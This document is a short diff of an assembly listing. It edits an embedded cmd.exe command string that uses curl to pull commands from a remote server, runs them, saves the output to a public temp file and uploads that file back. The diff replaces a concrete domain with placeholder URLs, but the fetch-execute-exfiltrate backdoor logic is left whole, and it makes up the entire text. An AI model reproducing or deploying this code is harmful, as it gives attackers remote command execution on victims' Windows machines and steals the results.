@@ -49,11 +49,10 @@ $LN10:
 	sub	rsp, 120				; 00000078H
 ; Line 26
 	CALL after_$SG90904
-$SG90904 DB	'cmd.exe /c "for /f "delims=" %i in (''curl https://r.baa'
-	DB	'lejibreel.com/shaddy/data.php'') do set output=%i && %i > C:\'
+$SG90904 DB	'cmd.exe /c "for /f "delims=" %i in (''curl url_to'
+	DB	'get_commands'') do set output=%i && %i > C:\'
 	DB	'users\public\temp.txt && curl --form "fileToUpload=@C:\users\'
-	DB	'public\temp.txt" https://r.baalejibreel.com/shaddy/getfile.ph'
-	DB	'p" ', 00H
+	DB	'public\temp.txt" url_to_upload_output_file', 00H
 	ORG $+7
 after_$SG90904:
 	POP  rax
